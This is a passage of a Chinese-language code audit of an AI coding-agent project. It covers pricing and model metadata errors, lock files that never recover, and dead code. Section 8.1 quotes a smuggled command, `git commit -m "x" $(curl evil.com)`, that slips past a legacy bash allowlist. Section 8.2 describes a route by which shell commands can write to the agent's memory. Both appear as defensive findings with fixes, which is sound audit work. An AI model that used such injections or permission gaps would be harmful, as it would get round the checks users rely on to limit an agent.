| `gpt-5.4` | 30 / 120（`cost-rates.ts:61`）；全部 OpenAI 模型 400K / 32,768（能力表:157-158） | 2.50 / 15.00，缓存输入 0.25；1.05M / 128K | 成本多报 8-12 倍；输出被截在 32K |
| Claude 5 系列（Opus 5.5、Sonnet 5.5、Haiku 5.5） | 能力表和费率表里都没有 | 均为 1M 上下文 | 手动选用时按 200K 做预算，成本为未知 |

- Opus 4.7、4.8 的模型级上限（1M / 128K）与官方一致，问题只在没有模型级条目的两个 4.6 模型。如果 200K 是为了避开长上下文计费而有意设的，能力表里也没有写明原因。
- **建议**：按官方价格页修正上表；给两个 4.6 模型补模型级上限；补 Claude 5 系列，或在文档里写明未收录；同步改 `cost-rates.test.ts`。

### 6.3 P1：Skill 的 `model: haiku` 和 `model: opus` 指向已退役的模型。VERIFIED

- 在 Anthropic Provider 上，`haiku` 映射为 `claude-3-5-haiku-latest`，`opus` 映射为 `claude-opus-4-1`。同一张映射表写了两份：`packages/coding/src/skill-invocation-policy.ts:316-325` 和 `packages/repl/src/interactive/invocation-runtime.ts:187-203`。
- 按 Anthropic 的模型表，Claude Haiku 3.5 已于 2026-02-19 退役，Claude Opus 4.1 的退役日期是 2026-08-05。两个目标都不在能力表和费率表里。
- 从 Claude Code 生态导入的 Skill 常写这两个别名。它们在 Anthropic 上会落到不存在的模型。这是按退役日期推断的，我没有实际调用去确认返回错误。
- **建议**：别名改为指向能力表里的当前模型，两份映射合成一份，并加测试要求别名目标在能力表中存在。

### 6.4 P2：SA 的 system 提示在会话的第 2 次请求时改变，缓存影响未测。机制 VERIFIED，代价 SUSPECTED

- SA 每次迭代都重建 system 提示。`run-substrate.ts:1673-1680` 调用 `resolvePerTurnReasoning`，再经 `reasoning-plan-entry.ts:84-122` 的 `buildSystemPrompt`，最后作为 `effectiveSystemPrompt` 发出（`run-substrate.ts:1768`）。
- `per-turn-reasoning.ts:84` 用 `messages.length === 1` 当作 `isNewSession`。只有会话的第一次请求满足它，于是 git-context 和 project-snapshot 两节（`capability-sections.ts:156-178`）只出现在第一次请求里。第二次请求起这两节消失，后面的 repo-intelligence、MCP、AGENTS.md、Skills 各节整体前移，第一次写入的 system 缓存用不上。
- repo-intelligence 一节（`capability-sections.ts:180-188`）按 cwd 缓存预取结果 60 秒（`middleware/repo-intelligence.ts:70`）。review、bugfix、edit、refactor 任务会带上改动范围（同文件:234-238）。缓存过期后，如果改动文件或行数统计变了，这一节随之改变，排在它后面的 AGENTS.md 和 Skills 各节一起失效。
- 工具定义排在 system 之前，不受影响。AMA 有意保持 system 前缀稳定（`task-engine/runner-driven.ts:1868-1891` 的注释）。
- 这与之前的 R17 探针结论（同目录新会话首请求命中 96%）不矛盾，R17 只测了首请求。
- **建议**：先用 R17 探针在多轮编辑任务上测各次请求的 `cache_read_input_tokens`。确认后，把只在首轮出现的节和改动范围移到消息侧后缀，让 system 段在会话内冻结。

### 6.5 P2：手册对 DeepSeek 的描述与代码矛盾。VERIFIED

- 手册:244-249 说默认模型是 `deepseek-v4-flash`，"两条 V4 路由都只支持文本"，费率为 Flash 0.14 / 0.28、Pro 0.435 / 0.87。
- 代码里默认模型是 `deepseek-flash`（能力表:163），能力为 `image-input-native`（能力表:198），费率为 Flash 0.14 / 0.56（`cost-rates.ts:76`）、Pro 0.63 / 1.89（`cost-rates.ts:78`）。
- 手册:1875-1877 写的是对的，所以手册自己前后矛盾。
- 用户问"DeepSeek 能看图吗"或"多少钱"时，模型会回答不能看图，并报出约一半的输出价。
- **建议**：修正这几行，并把 6.10 的一致性测试扩到手册里的默认模型和价格。

### 6.6 P2：提示词让模型调用一个不存在的工具 `set_permission_mode`。VERIFIED，早于 alpha.10

- 计划模式下拦截写操作时，`packages/repl/src/permission/executor.ts:50` 告诉模型："用户确认后，调用 `set_permission_mode`，mode 为 `accept-edits`"。
- 这个工具已经不存在：`packages/coding/src/agent-runtime/tool-execution-context.ts:20,191` 说明它不再转发，`packages/` 和 `src/` 里也没有任何注册。当前的路径是 `exit_plan_mode`。
- `exit_plan_mode` 的两份描述（`static-text.json:72`、`managed-tool-text.ts:40`）都写着"不要与 `set_permission_mode` 合用"，但没有说明原因（违反 ADR-033 第 3 条），而且向模型宣告了一个不存在的工具名。
- 模型照提示调用时，会得到未知工具错误，计划模式无法按提示退出。
- **建议**：`executor.ts:50` 改为引导模型调用 `exit_plan_mode`；从两份描述里删掉这句；按 `benchmark/EVAL_GUIDELINES.md` 补 eval。

### 6.7 P3：手册里的其他事实错误。VERIFIED

- Windows 沙箱 setup generation：手册:578 写 10，手册:1615、1873 写 11，代码是 11（`src/sandbox-runtime.ts:1125`）。
- 公开 Kimi 的模型列表（手册:198-203）没有列出 `kimi-k3.1-pro` 和 `kimi-k3.1-pro-highspeed`，能力表里有。
- 手册:95、2145 写 Node >= 20，`package.json:243` 要求 `>=20.16.0`。
- 手册里有 71 行带 alpha、beta 或 v0.7 版本号。ADR-033 第 5 条不让版本元数据进模型读的正文。但有些版本号本身就是用户问题的答案，需要逐条判断，不能一律删掉。

### 6.8 P3：alpha.10 之后新写的提示词违反 ADR-033。VERIFIED

下面几处在 alpha.10 的整棵树里都检索不到，是新写的：

- 数量阈值（第 1 条）：`static-text.json:185` "Before exploring 3+ files in one module"；`managed-tool-text.ts:41` "≤40 lines, ≤3 bullet levels"。
- 复合条件（第 2 条）：`static-text.json:253` "With at least two substantive independent lanes" 和 "require no progress AND a faster path"。
- 精简描述丢了原因（第 3 条）：完整的 edit 描述（`static-text.json:20`）解释了不先 read 的后果，精简版（`static-text.json:228`）只剩 "Read first."。现在同一条规则有两套措辞要维护。

另一处是旧的：bash 前缀分类器的提示开头是 "# Claude Code Code Bash command prefix detection"，并自称 "the Claude Code agent"（`static-text.json:252`，由 `bash-prefix-extractor.ts:83` 的 `BASH_POLICY_SPEC` 读取）。alpha.10 时已经如此，是照搬原文时带进来的。影响小，但改动时要跑分类器 eval。

### 6.9 P3：同一模型在不同路由上的元数据不一致

| 项 | 位置 | 状态 |
|---|---|---|
| K3.1 Pro 的输出上限：`kimi` 131,072，`kimi-code` 继承 32,000，`ark-coding` 128,000。K3 有对齐测试（`model-capabilities.test.ts:103-111`），K3.1 没有 | 能力表 | VERIFIED；是否应一致 SUSPECTED |
| MiniMax-M3：`minimax-coding` 为 `native-adaptive`，`ark-coding` 继承 `native-toggle`；deepseek-v4-pro：`deepseek` 为 `native-effort`，`ark-coding` 继承 `native-toggle` | 能力表 | VERIFIED；可能是各路由的真实差异，需要按厂商文档确认 |
| Codex CLI 桥：能力表声明了 `codex-cli-effort` 推理档位，类里自建配置写 `reasoningCapability: 'prompt-only'`、128K 上下文 | `packages/llm/src/providers/codex-cli.ts:13-22` | 代码 VERIFIED；运行时用哪一份 SUSPECTED |
| 预设与内置别名的 key 变量不同：预设 `kimi-coding` 用 `KIMI_API_KEY`，内置 `kimi-code` 用 `KIMI_CODE_API_KEY`；预设 `qwen-token-plan` 用 `QWEN_TOKEN_PLAN_API_KEY`，内置用 `QWEN_TOKEN_API_KEY` | `packages/llm/src/provider-presets.ts:27,40`；能力表:385,591 | VERIFIED |
| `cost-rates.ts:5` 的注释说支持 11 个内置 Provider，实际 16 个 | — | VERIFIED |

审计代理还报告了两处可能的缓存不稳定，我没有核对：上下文压力高时工具数组在会话中途变化（`context-budget.ts:361,367`、`tool-exposure-planner.ts`）；AMA 的精简契约在已适配的发现工具改变字节时回退到完整契约（`managed-system-contract.ts:38-45`）。可以在 6.4 的探针里一起测。

### 6.10 eval 缺口

- 三份数据文件是从 TS 字符串里抽出来的，仓库里没有检查抽取前后逐字节一致的测试。如果确实逐字节搬移，一个对照旧常量的快照测试就够，不需要 LLM eval。
- 现有的自我知识 eval（`benchmark/datasets/feature-218-self-knowledge/cases.ts`，79 行，最后修改于 2026-07-18）不涉及 Provider、价格和沙箱事实，所以 6.1、6.2、6.5、6.7 都没被发现。这类问题更适合用不调 LLM 的一致性测试抓：手册里的默认模型、能力和价格与能力表、费率表一致；每个默认模型都有费率和模型级上限；别名目标存在。
- bash 前缀分类器的提示和 `managed-tool-text.ts` 的精简描述都没有 eval 引用。`exit_plan_mode` 已有 eval（`tests/feature-189-batch4-quant-to-qual-*.eval.ts`），审计代理说它没有 eval 是错的。

### 6.11 提示词目录的其他改动（补充核对）

alpha.10 以来改动的提示词文件不止上面三份数据文件。我又逐个核对了 `role-prompt.ts`、`role-prompts.ts`（各净减 50 行）、`execution-guidance.ts`、`effective-permissions.ts`，以及新增的 `compact-worker-contract.ts`、`managed-system-contract.ts`，还有 `packages/agent/src/capabilities/skills/discovery.ts`。

- **结论：主要是把字符串搬进 `staticText`，行为上没发现新的高优先级问题**，也没有发现重复的阈值或复合条件。新增的内容只有两处：`readOnly` 意图在 host 模式未定义时也注入只读范围提示（`staticText` 的 `t12.prompts/effective-permissions.0`）；skills 发现遇到被遮蔽的同名 Skill 时发一条 warn 诊断，选择逻辑不变。
- **`toolPolicyFactory` 和 `buildManagedWorkerToolPolicy` 被整个删除，不是回归。** alpha.10 时它 `switch (role)` 的每个分支都返回 `undefined`，`runner-driven.ts` 传进去的工厂本来就是空操作。
- **`compactWorkerContract` 靠文本标记做替换**：它用 `REPO INTELLIGENCE TOOLS:` 和 `MUTATION DISCIPLINE:` 两个标记定位段落，任何一个改名就静默返回原文。这是 fail-open，最坏情况是退回完整契约，可以接受，但需要一条测试钉住这两个标记。
- `projectManagedSystemContract` 的字节匹配回退已在 6.9 末尾记过，这里不再重复。

### 6.12 核对过、没有问题的部分
- Opus 4.7、4.8 的上下文、输出上限和价格与官方一致。
- 审计代理逐条核对了手册里 20 多条说法（分类器超时、压缩默认值、Agent 协作上限等），没有发现问题；它也报告 16 个内置别名与能力表的磁盘副本一致。这两点我没有复核。
- 我否掉了审计代理的几条结论：Provider 的默认模型不出现在自己的 `models[]` 里是能力表的惯例，不是缺失；Gemini CLI 桥的上下文是 1M（`gemini-cli.ts:43`），不是 128K；Zhipu、Z.ai 的 16K 输出上限只作用于没有模型级条目的模型，不算 bug。

---

## 7. 不能自愈的机制

`kodax doctor` 不检测也不修复下面任何一项。共同模式：锁或日志文件在"创建"与"写入身份 / 删除"之间崩溃或删除失败后，读取方解析不出所有者，于是既不能判定它已废弃，也不能回收。

### 7.1 P0：核心配置写锁没有所有者和 TTL。VERIFIED

- `packages/repl/src/common/core-config-lock.ts:25-46`：`openSync(lockPath, 'wx')` 创建 `config.json.write.lock`，`finally` 里 `rmSync`。锁文件里不写 pid、不写时间。
- 进程在 `action()` 执行期间被杀（或 `rmSync` 因杀软 / 索引器占用失败），锁文件留下，之后每次配置写入都抛 `CoreConfigWriteConflictError`，没有任何回收路径。
- **建议**：写入 pid 与启动身份，EEXIST 时判断持有者是否存活再回收；或直接复用 `store-lock.ts` 的票据队列。

### 7.2 P0：owner 协调锁半写入后永久无法回收。VERIFIED

- `src/runtime-daemon/state.ts:459-488`：先 `openSync(..., 'wx')`，再 `writeFileSync` + `fsyncSync`。在两步之间崩溃，或 `writeFileSync` 抛错（如 ENOSPC），留下空文件或半截 JSON；抛错路径不会删掉自己刚创建的文件。
- 回收判断 `removeAbandonedRuntimeOwnerCoordination`（`:490-503`）先调用 `readRuntimeOwnerCoordinationHandle`（`:505-520`），解析失败返回 `undefined`，于是回收返回 `false`，获取也返回 `undefined`。
- `daemon stop --force`（`src/kodax_cli.ts:1557-1627`）走 `removeRuntimeDaemonOwnershipIfUnchanged`（`state.ts`），它第一步就要拿这把协调锁，拿不到就返回 `false`，结果报 `unverified_owner`。它对无法解析的 `daemon.lock` 同样拒绝删除（`currentLockOwner === undefined && fs.existsSync(paths.lockFile)` 返回 `false`）。
- 审计代理报告 `.product-host/startup.lock` 和 `.product-host` owner 锁有同样的窗口（`state.ts:823-854,882-919`），后果是每次启动在 `sdk-runtime.ts:5925-5950` 等满 60 秒超时，或报 `session_storage_owned`（SUSPECTED，我只核对了 owner-policy 锁）。
- **建议**：用"写临时文件再 `link`/重命名"的方式一次性发布带身份的锁；解析失败且文件超过一定年龄时按废弃处理；`--force` 对不可解析的锁给出可执行的清理路径。

### 7.3 P1：迁移日志或迁移锁删除失败后，会话读取永久报 `data_changed`。VERIFIED

- `packages/repl/src/interactive/session-migration.ts:484` 删除迁移日志时 `.catch(() => undefined)`；`releaseLock`（`:295-296`）删除 `.migration-lock` 时同样吞错。此时完成标记已经写入。
- 之后每次启动，`ensureLayoutMigrated`（`:496-500`）看到标记就直接返回，不再清理残留。
- `packages/repl/src/interactive/storage.ts:794-831` 的读取边界只要看到 `.migration-journal.jsonl` 或 `.migration-lock` 存在，就抛 `SessionReadError('data_changed')`。storage 里有 17 处调用这类检查。
- 触发条件是删除失败（Windows 上杀软或索引器占用较常见），结果是会话读取一直失败，直到用户手动删文件。
- **建议**：标记存在时顺手清理残留的日志与锁；读取边界对"标记已写且锁的持有者已死"的情况放行。

### 7.4 P1：执行事实文件损坏会让该会话的每个 Provider 请求失败。VERIFIED

- `src/execution-facts.ts:18-26` 的 `load` 对 JSON 解析失败或版本不符直接抛错。
- `provider()`（`:107`）经 `change()`（`:34-38`）调用 `load`。它作为 Provider 请求观察者被注册（`src/sdk-runtime.ts:5708`、`:9591`、`:11615`），在 `packages/llm/src/provider-request-observation.ts:71,128,166` 被同步调用，整条链上没有 try/catch。`:71` 在 `try` 之前，抛错直接让请求失败。
- `save`（`:27-33`）写临时文件再重命名，但不 fsync，断电后可能留下空文件。
- 每个观察事件都整文件重写，长会话里单次写入成本随请求数线性增长（SUSPECTED，未测量）。
- **建议**：观察者内部 catch 并记录诊断，不影响请求；损坏文件改名隔离后以 `coverage: 'partial'` 重建。

### 7.5 P1-P2：其他不能自愈的点（审计代理报告，SUSPECTED）

| 优先级 | 机制 | 位置 | 卡住的方式 |
|---|---|---|---|
| P1 | OAuth 会话存储的 mkdir 锁 | `oauth-session-store.ts:12-22,53-70` | 无所有者、无 TTL，且跨 DPAPI 调用持有 |
| P2 | 启动身份缺失时存活判断退化为只看 PID，且把 `undefined` 身份缓存下来 | `state.ts:96-103,685-710`、`store-lock.ts` | PID 复用时把死进程当成活的 |
| P2 | 集成配置锁 | `integration-config.ts:577-588` | 可能卡住，tmp 文件泄漏 |
| P2 | 一个损坏的待处理输入文件阻塞整个 profile | `sdk-runtime.ts:17002-17015`（`:9831` 调用） | 不跳过坏文件 |
| P2 | `config.json` 写入不是原子的 | `utils.ts:270-334`、`sdk-runtime.ts:22928-22990` | 已有 `writeCoreConfigAtomically` 没用上 |
| P2 | 扩展存储静默清空 | `session-lineage/persistence.ts:215-262` | 解析失败当作空 |
| P2 | `runtime-agent-store.ts:77-112`、`a2a/task-store.ts:261-311` | — | 最后一行写坏，历史整体不可读 |
| P2 | 损坏的 owner 策略、managed-child 注册表 | `state.ts:223-248`；Issue 371 仍 Open | — |
| P2 | 版本错配需要手动重启 | `sdk-runtime.ts:6125-6185,6255-6300,6640-6705`、`runtime-build-identity.ts:59-102` | 不自动换代 |
| P2 | 恢复客户端把非瞬时失败一直保留 | `recovering-runtime-client.ts:78-97,126-131` | 不再重试 |
| P3 | `daemon.log` 不轮转、`daemon.token` 非原子写、`.released` 学习锁标记累积（Issue 185）、bootstrap / tmp / budget / worktree 标记孤儿文件、Windows 沙箱 ACL 毒票据、actor owner 缺存活字段 | — | 缓慢累积 |

### 7.6 设计良好、应保持不动的自愈机制

- Runtime 原子写入器（`sdk-runtime.ts:17411-17458`）及 `state.ts:585-630` 的 EPERM 重试
- `store-lock.ts` 的票据队列（Issue 301 的修复）
- run 状态索引重建、actor owner 的 TCP 存活探测、workflow worktree 清扫、managed-child 隔离
- `auth-file` 使用 proper-lockfile
- 会话迁移锁本身有过期回收（`session-migration.ts:271-293`），问题只在 7.3 所说的残留

没有审计的：checkpoint、capacity-recovery、history-capacity-recovery 内部；`windows-text-transaction` 的原生日志；MCP OAuth token 存储；`kodax_resume`；`shell-execution`；多实例。

**统一建议**：所有 `wx` / `mkdir` 锁统一成"所有者 + 启动身份 + 解析失败按年龄回收"一条规则（复用 `store-lock.ts`）；`kodax doctor` 增加锁、迁移日志、损坏 JSON 的检测与修复。

---

## 8. 需要更新的机制

### 8.1 P1：bash 允许列表在没有 extractor 时退回可注入的 `startsWith` 匹配。VERIFIED

- `packages/coding/src/permissions/permission.ts:939` 的 `isToolCallAllowed` 在调用方没传 `BashPrefixExtractor` 时，走 `matchesBashPatternLegacy`（`:871`，`:997-1003`）。它自己的注释承认 `git commit -m "x" $(curl evil.com)` 会匹配 `git commit:*`，计划 v0.8 移除。
- KodaX 自己的 REPL 都会传 extractor（`repl.ts:1101`、`InkREPL.tsx:6019-6025`）。但 `isToolCallAllowed` 经 `packages/coding/src/index.ts:1297` 的 `export *` 公开；`packages/repl/src/permission/executor.ts` 的 `createPermissionContext` 也公开（`permission/index.ts:48`），其中 `bashPrefixExtractor` 是可选参数，`accept-edits` 模式下直接把它传给 `isToolCallAllowed`（`executor.ts:96-105`）。任何不传 extractor 的嵌入方都落到不安全路径。
- 沙箱仍限制文件系统写入，所以后果取决于嵌入方的沙箱设置。
- **建议**：没有 extractor 时 fail-closed，只接受与模式完全相同的命令，或只认无任何 shell 元字符的命令。

### 8.2 P2：shell 写 memory 的拦截已移除，沙箱又没有保护 memory 目录。VERIFIED

- fbbe3ca8c（2026-08-30，"align permission routing with sandbox-first execution"）从 bash 工具中删除了 `shellMemoryMutationDenial` 调用，改由沙箱承担。文件工具（`edit.ts:61`、`insert-after-anchor.ts:23`、`multi-edit.ts`）仍然调用 `memoryMutationDenial`。
- 沙箱默认可写根只有工作区、临时目录和显式授权（`src/sandbox-runtime.ts:4729-4737`），所以通常 `~/.kodax/memory-scopes` 不可写。
- 但 `memory-scopes` 不在 denyWrite 的受保护目录里（`WORKSPACE_SHELL_INTERNAL_AGENT_HOME_DIRECTORIES`，`sandbox-runtime.ts:531-536`，只有 `native-text-state-v1`、`runtime`、`processes`、`learned`），也不在 `packages/coding/src/permissions/agent-home-policy.ts:7-12` 的 `PROTECTED_DIRECTORIES` 里。工作区就是用户主目录、或授权了 agent home 写入时，shell 可以改写 memory，而文件工具不行。
- `shellMemoryMutationDenial`（`tools/memory-mutation-guard.ts:9`）现在只有测试调用，`memory-mutation-guard.test.ts` 给人"仍有防护"的错觉。
- **建议**：把 `memory-scopes` 加入沙箱 denyWrite 和 `PROTECTED_DIRECTORIES`，删除孤儿函数及其测试。

### 8.3 P2：两份 `process-tree.ts` 已经分叉。VERIFIED

- `packages/llm/src/cli-events/process-tree.ts`（702 行）头部要求与 `packages/agent/src/runtime/process-tree.ts`（1257 行）保持同步。
- agent 版本在 2026-10-29（a3035337e、986cedd66）和 10-31（adc8bbc06）拿到了 Windows Job 隔离与进程身份修复；llm 版本最后一次修改是 2026-09-14（ad8b88ce9）。没有一致性测试。
- 后果（SUSPECTED）：Gemini CLI、Codex CLI 这类 Provider 子进程的清理拿不到新的身份与 Job 保护。
- **建议**：把共享内核放在 llm（agent 已依赖 llm，不破坏分层），agent 在其上扩展。

### 8.4 P2：其他需要收敛的重复实现

- `auth.json` 路径在至少 6 处各自拼接：`src/cli-provider-credentials.ts:12`、`provider-credential-manager.ts:47`、`provider-oauth-store.ts:8`、`packages/repl/src/common/provider-setup.ts:114`、`src/sandbox-runtime.ts:4721`、`agent-home-policy.ts:14`。其中一处改名，沙箱的 deny 规则就可能和真实写入路径脱节。VERIFIED。
- reasoningMode → effort 的映射复制了 4 份：`run-substrate.ts:492`、`runner-driven.ts:408`、`llm-adapter.ts:289`、`task-engine.ts:339`。VERIFIED（审计代理）。
- `learned-skill-runtime.ts` 只被 `run-substrate.ts:188` 导入，AMA 路径可能没有绑定学到的 Skill。SUSPECTED。
- 有两套 session / compaction 栈：Layer A（`primitives/session.ts`、`LineageExtension`、`LineageCompaction`）与生产使用的 `KodaXSessionLineage`。`packages/coding/src/index.ts:1086-1089` 的注释说 `KodaXSessionLineage` 已被取代、计划在 FEATURE_086（v0.7.27）移除，实际情况相反：生产仍在用它，被"取代"的那套才是闲置的。注释应改正，闲置的那套应进入淘汰流程。

---

## 9. 应废弃或淘汰的代码

### 9.1 P2：repl 里第二份 Ink fork 的大部分不可达。VERIFIED

- `packages/repl/src/tui/substrate/ink/` 跟踪了 65 个手写 `.js`（没有对应的 `.ts`）、55 个 `.js.map`、28 个 `.ts`。
- 生产代码只经两个入口进入这个目录：`render-to-string.js`（`ui/utils/render-finalized-sections.tsx:23`）和 `inline-scrollback-ledger.ts`（`InkREPL.tsx:471`、`ui/utils/inline-ledger-controller.ts:13`）。
- 从这两个入口沿相对导入追踪：可达 24 个文件，不可达 54 个、约 4,937 行。不可达的包括 8 个有单测的 `.ts`：`apply-cell-frame`、`apply-diff`、`cell-renderer`、`cell-renderer-primitives`、`csi`、`osc`、`terminal-emulator`、`viewport-state`。这些单测让覆盖率数字好看，但测的是生产不走的代码。实际的 live 渲染器在 `tui/core/`。
- `input-parser.js`、`parse-keypress.js`、`kitty-keyboard.js` 在 `tui/core/` 有对应的 live `.ts` 版本，这里的是副本。
- 55 个 `.js.map` 被跟踪，因为 `.gitignore:18` 的 `src/**/*.js.map` 锚定在仓库根，匹配不到 `packages/repl/src/...`。

### 9.2 P2：未使用的依赖与不可达的 UI。VERIFIED

- `packages/repl/package.json:36-39`：`ink-spinner`、`ink-text-input` 没有任何导入；`ink` 只被 1 个测试文件导入。三者都是运行时依赖。
- 约 11 个 UI 文件（约 1.2k 行）不被生产代码引用，如 `ui/App.tsx`、`ToolGroup.tsx`、`LayeredMessageSurface.tsx`、`SessionHistory.tsx`、`PendingInputsIndicator.tsx`、`useKeypress.ts`、`useKeypressed.ts`、`useQueuedPrompts.ts`、`mock-ui.ts`、`prompt-surface-layout.ts`，以及 `LegacyMessageList`（`MessageList.tsx:871`）。它们经 `src/sdk-repl.ts:27` 公开，需走弃用流程，不能直接删。
- `InkREPL.tsx:218` 导入了 `createPermissionContext` 但从不调用。

### 9.3 可直接删除（无生产调用者）

| 符号 / 文件 | 位置 | 备注 |
|---|---|---|
| CAP-017/018/088 judges | `packages/coding/src/agent-runtime/middleware/judges.ts` 的 5 个导出 | VERIFIED。51fb53d32 退役 CAP-019 时有意删除了调用点，模块和 3 个 contract 测试留下了；`run-substrate.ts:474,3247` 的注释仍说它们"住在"这里 |
| `shellMemoryMutationDenial` | `tools/memory-mutation-guard.ts:9` | VERIFIED，见 8.2 |
| `setMaxOutputTokensOverride` 及其 AsyncLocalStorage | `packages/llm/src/providers/base.ts:321` | VERIFIED，只有测试 |
| `WINDOWS_TEXT_TRANSACTION_PROTOCOL`、`isKodaXSessionUiHistory`、`globalCommandRegistry`（`commands/registry.ts:277`）、`saveAlwaysAllowTool`（`permission-config.ts:251`）、`isIdleYieldEnabled`（`idle-yield.ts:118`）、`createSkillWatcher` | — | VERIFIED，只有定义和 barrel 导出 |
| Layer A session / compaction 原语 | `packages/agent/src/primitives/session.ts`、`compaction.ts`，coding `index.ts:1084` 的再导出 | VERIFIED，只在自身和 barrel 中引用；公开 API，需先弃用 |
| `CompactionConfig.*Percent`、`CompactionCacheContext.reasoning`、`MemoryPack.hints`、`semantic_prefetch` | llm / agent | 审计代理报告 |
| media shim、`turn-context.ts`、`runner-nudges.ts`、`parse-helpers.ts`、`prompts/memory-section.ts`、`output-filters/compiled`、`memory/policy-artifact.ts`、`agents/index.ts`、`parallel-dispatch.ts`、`onChildProgress`、`MANUAL_*_MAX_BYTES`、`fallbackToNormalExecution`、`inferPermissionMode` | coding | 审计代理报告；`orchestration.ts`（1056 行）看起来已被取代，需确认 |
| `scripts/exclude-tests-from-build.mjs`、`patch-publish-fields.mjs`、`probe-sdk-stdin.mjs` | — | 0 处引用 |
| 根目录 `tmp_diffstat.txt` | — | 未跟踪也未被忽略；两个 tgz（10.7 MB、12 MB）和 `Microsoft/` 已被忽略，属本地残留 |

### 9.4 先迁移调用方再删除

| 项 | 位置 | 需要先做的事 |
|---|---|---|
| `createWindowsTrustedTextMutationHost` | 1 个生产文件，2 个测试文件（共约 23 处使用） | 迁移测试 |
| providers 弃用 barrel | `packages/coding/src/providers/index.ts`，8 个导入方 | 改为直接导入 |
| auto-mode 的 `rules` / `askUser` 管道 | `auto-mode-bootstrap.ts` 等 | 移除后改用现行配置 |
| `pollIntervalMs`、`CompactionConfig.enabled`、`userInvocable`（client 契约）、`candidateRefs`、`WorkflowRuntime.output` | `embedder-guide.md:4721` 等仍有引用 | 更新文档与调用方 |
| `CostRate.cachePer1M` | 约 17 行定价数据里唯一的缓存价 | 先补齐读写分开的缓存价 |
| `reasoningPreset` / `reasoningCapability` / `supportsThinking` | `provider-capabilities.json` 中分别出现 64、57、16 次 | `types.ts:657,794` 的 `@deprecated` 说"加载时自动迁移"，实际没有迁移，标注本身是错的 |
| 学习 Skill 的按 binding 迁移 | 两个 binder 仍在调用，`migratedActive = 0` | 确认无存量数据后删除 |
| episode review v1、workflows 旧开关、`KODAX_REPOINTEL_*` 桥、auto-mode 旧 `<block>` 解析器、无操作的 invariant | — | 都已过迁移窗口 |
| `OrchestrationTraceEvent` | 带着错误的 `@deprecated` 标注 | 改正标注 |
| 无效输入 `envPass`、`enabled`、`timeoutMs`；永远为 `[]` 的 `harnessTransitions` | coding | 删除字段或接上实现 |

### 9.5 已过期的兼容窗口

- 权限模式别名（`utils.ts:281,318`）、`-n` / `-y` 无操作参数、`kodax_cli.ts:3346` 的死分支。审计代理报告。
- `amaw → ama` 仍在 `src/cli_option_helpers.ts:193`；`src/runtime-daemon/schema.ts:1489` 和 `src/sdk-runtime.ts:18245` 的枚举仍接受 `'sa'` 和 `'amaw'`，而 CLI 已退役 SA（见 5.3）。VERIFIED。
- `POST_COMPLETION_LINGER_MS` / `lastAllCompletedAt` 已超期约 59 个版本。
- 计划 0.8 再处理、现在保留：`ensureExampleConfigFile`（公开 API）、`sdk-runtime` 的 `autoStart` / `userInvocableOnly` / `activeAgentTasks` / `allow_always` 作用域、tool-result-budget 与截断 guardrail 的公开兼容项、`matchesBashPatternLegacy`（但其默认行为应先改成 fail-closed，见 8.1）。

### 9.6 测试 helper 进入公共 barrel

除 4.4 列出的之外，`resetSkillRegistry`、`_getRegisteredProcessors`、`createMcpTestServerFixture` 也在公共导出中，应一并移到 `/testing`。

---

## 10. 技术债

### 10.1 文档体量已超过人和模型的可读范围。VERIFIED

| 文件 | 大小 |
|---|---|
| `docs/KNOWN_ISSUES.md` | 1,044,758 字节，18,482 行；约 200 个已解决条目未归档，34 处标记为 Open |
| `docs/ADR.md` | 560,924 字节 |
| `docs/release.md` | 191,191 字节 |
| `docs/HANDOFF.md` | 175,232 字节 |
| `docs/FEATURE_LIST.md` | 168,091 字节 |

模型和新成员都无法一次读完这些文件，过期内容（如 4.3 的 `runtimeExitSettlement`）因此长期留存。建议把已解决 Issue 和旧版本发布块移到按版本归档的文件里，ADR 恢复编号。`docs/CLAUDE.md` 的文档清单也已过期：`HANDOFF.md`、`LLM_INTEGRATION.md`、`CLIENT_CONTRACT.md`、`SDK_MIGRATION.md` 都是实际在用的文档，却不在清单里。

### 10.2 工程债

- 没有 linter，测试大多不做类型检查（见 1.2）。
- `packages/repl/tsconfig.json` 排除了 `src/tui/substrate/ink/terminal-emulator.ts`，它只被测试使用，任何地方都不做类型检查。
- `test:bundle` 每个 tag 跑 8 次；Windows v2、Electron、文本门禁在 CI 的 Electron job 和 release 的 win-x64 构建里各跑一次；linux-arm64 / darwin 的 native 和 POSIX 门禁在 CI 和 release 构建里重复。这些拖长了发布关键路径，却没有覆盖 2.2 的空洞。
- 项目里真正的 TODO 债不多；worker 入口都是 live 的，不能当死代码删。

---

## 11. 看起来像遗留、但应保持不动的部分

- DPAPI sealed 存储：它是旧凭据的迁移来源。
- "legacy" 渲染器：tmux 下的回退路径。
- classic REPL：仍是受支持的入口。
- `legacy-tool-pairing.ts` 与 `legacyReports`：仍有调用。
- worker 入口文件：都是 live 的。
- 7.6 列出的自愈机制，以及 3.3 末尾列出的凭据链健全项。

---

## 12. 建议的处理顺序

1. **补上 tag 时的覆盖**（2.2、2.3）：Windows job 覆盖所有含 `runIf(win32)` 的文件；补上 Issue 345 的单测。不改变触发频率——push/PR 触发是刻意的取舍（2.1），不要加。
2. **会卡死的自愈缺口**（7.1-7.4）：核心配置写锁、owner 协调锁、迁移残留、执行事实损坏。每一项都会让用户卡住且只能手动删文件。
3. **凭据链**（3.1、3.2）：凭据缓存失败重置与按来源隔离；原生 Anthropic（及 OpenAI）客户端不再继承环境里的 token 与 base URL。
4. **模型元数据**（6.1、6.2、6.3、6.5、6.7）：补默认模型的费率；按官方修正价格与上限；Skill 别名改指当前模型；修正手册里的 DeepSeek 与其他事实；加 6.10 的不调 LLM 的一致性测试。
5. **工具输出 GC**（5.1）：由 Host 接手引用感知的清理。
6. **安全收紧**（8.1、8.2）：bash 允许列表无 extractor 时 fail-closed；`memory-scopes` 加入受保护目录。
7. **提示词**（6.4、6.6、6.8）：先用 R17 探针量 SA 的缓存损失，确认后冻结会话内的 system 段；`set_permission_mode` 的引导改为 `exit_plan_mode`；按 ADR-033 改写新写的阈值与复合条件。每项都按 `benchmark/EVAL_GUIDELINES.md` 配 eval。
8. **契约面**（4.1-4.4）：删除或生成 `kodaxRuntimeContracts`；一个能力副本一致性测试；修正 `runtimeExitSettlement` 文本与钉住它的测试；测试 helper 移出公共 barrel；加 `.d.ts` 导出清单快照。
9. **文档**（4.8、4.9、10.1）：FEATURE_302 的 ADR（特别是 `auth.json` 与 ADR-068 的关系）；修正 SDK 文档里的错误导入；归档 KNOWN_ISSUES。
